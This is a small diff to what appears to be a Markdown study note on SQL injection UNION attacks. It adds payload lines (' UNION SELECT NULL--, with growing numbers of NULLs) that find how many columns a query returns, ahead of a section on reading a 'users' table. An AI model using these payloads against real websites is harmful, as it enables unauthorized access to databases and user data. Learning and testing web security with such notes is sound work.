@@ -1,4 +1,4 @@
-# Union
+# Union attacks
 
 Determine number of columns:
 
@@ -7,6 +7,13 @@ Determine number of columns:
 ```
 
 * example is for 2 columns
+
+```
+' UNION SELECT NULL-- 
+' UNION SELECT NULL,NULL-- 
+' UNION SELECT NULL,NULL,NULL-- 
+etc.
+```
 
 Retrieve contents of `users` table:
 
